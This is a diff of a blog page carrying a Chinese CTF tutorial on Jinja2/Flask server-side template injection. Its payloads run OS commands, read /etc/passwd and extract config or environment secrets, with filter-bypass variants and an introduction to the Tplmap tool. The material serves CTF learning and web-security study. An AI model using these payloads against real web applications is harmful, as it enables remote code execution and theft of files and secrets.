@@ -18,7 +18,7 @@
 <meta property="og:image" content="https://skyinhand.github.io/post/b3e5dcd8/views.png">
 <meta property="og:image" content="https://skyinhand.github.io/post/b3e5dcd8/global_vars.png">
 <meta property="article:published_time" content="2021-05-04T09:22:25.000Z">
-<meta property="article:modified_time" content="2021-05-04T09:59:20.019Z">
+<meta property="article:modified_time" content="2021-05-04T10:12:56.022Z">
 <meta property="article:author" content="掌上天空">
 <meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
@@ -213,51 +213,27 @@
 <span id="more"></span>
 
 <h2 id="模板初识"><a href="#模板初识" class="headerlink" title="模板初识"></a>模板初识</h2><p><strong>在Jinja2模板中, { { } }是变量包裹的标识符, { { } }不仅可以包裹变量，而且可以执行一些表达式</strong></p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span> username <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># 可以显示username变量中的的内容</span>
-<span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span> <span class="token number">1</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true"># 可以显示3</span>
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; username &#125;&#125; <span class="comment"># 可以显示username变量中的的内容</span></span><br><span class="line">&#123;&#123; <span class="number">1</span> + <span class="number">2</span> &#125;&#125; <span class="comment"># 可以显示3</span></span><br></pre></td></tr></table></figure>
+
 <p>下面的图示显示了SSTL的基本用法</p>
 <p><img src="/post/b3e5dcd8/views.png" alt="基本用法"></p>
 <p>若将id=8改为 id=即可显示flask中的一些配置信息</p>
 <p><img src="/post/b3e5dcd8/global_vars.png" alt="配置信息"></p>
 <h2 id="深入SSTI"><a href="#深入SSTI" class="headerlink" title="深入SSTI"></a>深入SSTI</h2><ol>
 <li><p>Python的魔法方法</p>
-<pre class=" language-python"><code class="language-python">__class__ <span class="token comment" spellcheck="true"># 返回类型所属的对象</span>
-__mro__ <span class="token comment" spellcheck="true"># 返回一个对象的积累元组, 方法在解析时按照元组的顺序解析</span>
-__bases__ <span class="token comment" spellcheck="true"># 返回对象所继承的基类</span>
-__subclasses__ <span class="token comment" spellcheck="true"># 返回当前类中子类的列表</span>
-__init__ <span class="token comment" spellcheck="true"># 类的初始化方法</span>
-__globals__ <span class="token comment" spellcheck="true"># 查看全局变量</span>
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__class__ <span class="comment"># 返回类型所属的对象</span></span><br><span class="line">__mro__ <span class="comment"># 返回一个对象的积累元组, 方法在解析时按照元组的顺序解析</span></span><br><span class="line">__bases__ <span class="comment"># 返回对象所继承的基类</span></span><br><span class="line">__subclasses__ <span class="comment"># 返回当前类中子类的列表</span></span><br><span class="line">__init__ <span class="comment"># 类的初始化方法</span></span><br><span class="line">__globals__ <span class="comment"># 查看全局变量</span></span><br></pre></td></tr></table></figure></li>
 <li><p>查看元组的类别</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__
-<span class="token operator">&lt;</span>type <span class="token string">'tuple'</span><span class="token operator">></span>
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__</span><br><span class="line">&lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br></pre></td></tr></table></figure></li>
 <li><p>寻找object类</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__
-<span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token keyword">class</span> <span class="token string">'object'</span><span class="token operator">></span><span class="token punctuation">,</span><span class="token punctuation">)</span>
-</code></pre>
-</li>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__</span><br><span class="line">(&lt;class &#x27;object&#x27;&gt;,)</span><br></pre></td></tr></table></figure></li>
 <li><p>查看object类的所有子类</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__subclasses__
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">().__class__.__bases__.__subclasses__</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><ol>
 <li><p>利用eval 进行命令执行(59 未必是eval类的所在处, python版本不同, 此处索引有可能不同)</p>
-<pre class=" language-python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'eval'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'__import__("os").popen("whoami").read()'</span><span class="token punctuation">)</span>
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&#x27;</span>)</span><br></pre></td></tr></table></figure></li>
 <li><p>利用 commands 进行命令执行。</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'commands'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>getstatusoutput<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
-
-<span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'__import__'</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
-
-<span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">.</span>__builtins__<span class="token punctuation">.</span>__import__<span class="token punctuation">(</span><span class="token string">'os'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>popen<span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;commands&#x27;</span>).getstatusoutput(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"></span><br><span class="line">&#123;&#125;.__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__.__builtins__.<span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).popen(<span class="string">&#x27;id&#x27;</span>).read()</span><br></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="题解套路"><a href="#题解套路" class="headerlink" title="题解套路"></a>题解套路</h2><ol>
 <li>  可以获取当前设置，如果题目是这样的：</li>
@@ -268,55 +244,40 @@ __globals__ <span class="token comment" spellcheck="true"># 查看全局变量</
 <p>   可以直接访问  或者  得到 flag。</p>
 <ol start="2">
 <li><p>同样可以找到 config。</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span>self<span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>_TemplateReference__context<span class="token punctuation">.</span>config<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p>[]、()</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">68</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'os'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__dict__<span class="token punctuation">.</span>environ<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">68</span>].__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].__dict__.environ[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p>url_for、g、request、namespace、lipsum、range、session、dict、get_flashed_messages、cycler、joiner、config等</p>
 <p>如果上面提到的 config、self 不能使用，要获取配置信息，就必须从它的全局变量（访问配置 current_app 等）。例如：</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span>url_for<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>FLAG<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span>get_flashed_messages<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">.</span>FLAG<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span>request<span class="token punctuation">.</span>application<span class="token punctuation">.</span>__self__<span class="token punctuation">.</span>_get_data_for_json<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'json'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>JSONEncoder<span class="token punctuation">.</span>default<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[<span class="string">&#x27;json&#x27;</span>].JSONEncoder.default.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></li>
 <li><p>过滤了 []、.</p>
 <p>pop() 函数用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。</p>
-<pre class=" language-python"><code class="language-python"><span class="token string">''</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__mro__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
+
 <p>在这里使用 pop 函数并不会真的移除，但却能返回其值，取代中括号来实现绕过。</p>
 <p>若.也被过滤，使用原生 JinJa2 函数 |attr()</p>
 <p>即将 request.<strong>class</strong> 改成 request|attr(“<strong>class</strong>“)</p>
 </li>
 <li><p>过滤下划线 _</p>
 <p>利用 request.args 的属性</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span> <span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>mro<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>subclasses<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">&amp;</span><span class="token keyword">class</span><span class="token operator">=</span>__class__<span class="token operator">&amp;</span>mro<span class="token operator">=</span>__mro__<span class="token operator">&amp;</span>subclasses<span class="token operator">=</span>__subclasses__
-</code></pre>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &#x27;&#x27;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&#x27;/etc/passwd&#x27;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>
+
 <p>将其中的 request.args 改为 request.values，则利用 post 的方式进行传参。</p>
 <p>GET:</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span> <span class="token string">''</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>value<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>value<span class="token punctuation">.</span>mro<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span>request<span class="token punctuation">.</span>value<span class="token punctuation">.</span>subclasses<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">'/etc/passwd'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>[request.value.<span class="keyword">class</span>][request.value.mro][<span class="number">2</span>][request.value.subclasses]()[<span class="number">40</span>](<span class="string">&#x27;/etc/passwd&#x27;</span>).read() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
 <p>POST:</p>
-<pre class=" language-python"><code class="language-python"><span class="token keyword">class</span><span class="token operator">=</span>__class__<span class="token operator">&amp;</span>mro<span class="token operator">=</span>__mro__<span class="token operator">&amp;</span>subclasses<span class="token operator">=</span>__subclasses__
-</code></pre>
-</li>
+<figure class="highlight"><table><tr><td class="code"><pre><span class="line">class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure></li>
 <li><p>过滤引号 “</p>
 <p>request.args 是 flask 中的一个属性，为返回请求的参数，这里把 path 当作变量名，将后面的路径传值进来，进而绕过了引号的过滤。</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__bases__<span class="token punctuation">.</span>__getitem__<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">)</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>path<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>path<span class="token operator">=</span><span class="token operator">/</span>etc<span class="token operator">/</span>passwd
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__.__getitem__(<span class="number">0</span>).__subclasses__().pop(<span class="number">40</span>)(request.args.path).read()&#125;&#125;&amp;path=/etc/passwd</span><br></pre></td></tr></table></figure></li>
 <li><p>一些关键字被过滤。</p>
 <p><strong>base64编码绕过</strong><br>用于__getattribute__使用实例访问属性时。</p>
 <p>例如，过滤掉 <strong>class</strong> 关键词</p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">'X19jbGFzc19f'</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-</code></pre>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(<span class="string">&#x27;X19jbGFzc19f&#x27;</span>.decode(<span class="string">&#x27;base64&#x27;</span>)).__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 <p><strong>字符串拼接绕过</strong></p>
-<pre class=" language-python"><code class="language-python"><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token string">'__c'</span><span class="token operator">+</span><span class="token string">'lass__'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token string">"/etc/passwd"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
-<span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">{</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__getattribute__<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'__c'</span><span class="token punctuation">,</span><span class="token string">'lass__'</span><span class="token punctuation">]</span><span class="token operator">|</span>join<span class="token punctuation">)</span><span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span> 
-</code></pre>
-</li>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(<span class="string">&#x27;__c&#x27;</span>+<span class="string">&#x27;lass__&#x27;</span>).__base__.__subclasses__()[<span class="number">40</span>](<span class="string">&quot;/etc/passwd&quot;</span>).read()&#125;&#125;</span><br><span class="line">&#123;&#123;[].__getattribute__([<span class="string">&#x27;__c&#x27;</span>,<span class="string">&#x27;lass__&#x27;</span>]|join).__base__.__subclasses__()[<span class="number">40</span>]&#125;&#125; </span><br></pre></td></tr></table></figure></li>
 </ol>
 <h2 id="工具篇"><a href="#工具篇" class="headerlink" title="工具篇"></a>工具篇</h2><h3 id="Tplmap"><a href="#Tplmap" class="headerlink" title="Tplmap"></a>Tplmap</h3><blockquote>
 <p>服务器端模板注入和代码注入检测与开发工具</p>
@@ -325,12 +286,12 @@ __globals__ <span class="token comment" spellcheck="true"># 查看全局变量</
 <p><strong>使用</strong></p>
 <p>获取：<a href="https://link.zhihu.com/?target=https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>
 <p>安装第三方依赖：</p>
-<pre class=" language-bash"><code class="language-bash">pip <span class="token function">install</span> -r requirements
-</code></pre>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pip install -r requirements</span><br></pre></td></tr></table></figure>
+
 <p>Tplmap 不仅利用了文件系统的漏洞，而且还具有使用不同参数访问底层操作系统的能力。</p>
 <p>以下命令可用于测试目标URL中的易受攻击的参数。</p>
-<pre class=" language-text"><code class="language-text">./tplmap.py -u <'目标网址'>
-</code></pre>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">./tplmap.py -u &lt;&#x27;目标网址&#x27;&gt;</span><br></pre></td></tr></table></figure>
+
 <p>执行该命令后，该工具会针对多个插件测试目标 URL 以查找代码注入机会。</p>
 
       
@@ -565,15 +526,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">杂项</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">地图工坊</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">CTF</a>
               </li>
             
             <div class="clearfix"></div>
